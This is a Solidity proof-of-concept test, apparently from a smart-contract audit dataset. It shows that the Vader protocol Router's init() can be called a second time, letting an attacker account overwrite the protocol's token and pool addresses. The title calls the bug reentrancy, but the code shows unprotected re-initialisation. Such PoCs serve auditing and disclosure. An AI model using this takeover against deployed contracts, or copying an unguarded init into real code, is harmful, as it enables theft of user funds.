// SPDX-License-Identifier: MIT
pragma solidity 0.8.3;

import "/home/mat/certora-ac-audit/certora-ac-datasets/detasets/web3bugs/dataset/web3bugs/5/vader-protocol/contracts/Router.sol";

interface Vm {
    function prank(address sender) external;
}

/// @title PoC: Router Init Reentrancy
/// @notice Demonstrates that Router init() can be called twice
contract PoC_RouterInit {
    Vm private constant vm = Vm(
        address(uint160(uint256(keccak256("hevm cheat code"))))
    );

    Router private target;
    address private constant DEPLOYER = address(0xD0B);
    address private constant ATTACKER = address(0xA11CE);
    address private constant VADER_ADDR = address(0x1001);
    address private constant USDV_ADDR = address(0x2002);
    address private constant POOLS_ADDR = address(0x3003);

    function setUp() public {
        vm.prank(DEPLOYER);
        target = new Router();
    }

    /// @notice First call initializes with deployer's addresses
    function test_exploit() public {
        // Step 1: Deployer initializes with legitimate addresses
        vm.prank(DEPLOYER);
        target.init(VADER_ADDR, USDV_ADDR, POOLS_ADDR);

        // Verify first init succeeded
        require(target.VADER() == VADER_ADDR, "First init failed");

        // Step 2: Attacker calls init with attacker-controlled addresses
        address maliciousVader = address(0xBAD1);
        address maliciousUsdv = address(0xBAD2);
        address maliciousPools = address(0xBAD3);

        vm.prank(ATTACKER);
        target.init(maliciousVader, maliciousUsdv, maliciousPools);

        // Impact: Protocol addresses have been overridden by attacker
        require(target.VADER() == maliciousVader, "Exploit failed - VADER not overridden");
        require(target.USDV() == maliciousUsdv, "Exploit failed - USDV not overridden");
        require(target.POOLS() == maliciousPools, "Exploit failed - POOLS not overridden");
    }
}
